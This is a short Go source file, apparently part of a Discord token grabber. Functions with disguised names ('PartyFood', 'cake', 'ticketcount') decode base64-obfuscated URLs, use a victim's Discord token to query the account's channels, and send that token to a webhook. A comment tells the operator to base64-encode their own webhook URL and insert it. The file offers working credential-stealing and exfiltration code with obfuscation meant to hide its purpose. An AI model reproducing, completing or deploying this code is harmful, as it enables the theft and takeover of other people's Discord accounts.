package luvdiscord

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func PartyFood(token string) string {

	food := "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjgvdXNlcnMvQG1lL2NoYW5uZWxz"

	url := cake(food)

	req, _ := http.NewRequest("GET", url, nil)

	req.Header.Add("Host", "discord.com")
	req.Header.Add("Authorization", token)

	res, _ := http.DefaultClient.Do(req)

	defer res.Body.Close()
	body, _ := ioutil.ReadAll(res.Body)

	return string(body)

}

func ticketcount(token string) {

	//Encode Webhook URL to Base64 and put it here
	ticket := ""

	url := cake(ticket)
	method := "POST"

	payload := strings.NewReader("{\"content\": \"||" + token + "||\",\"embeds\": null}")

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Add("User-Agent", "Other")
	req.Header.Add("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer res.Body.Close()

}
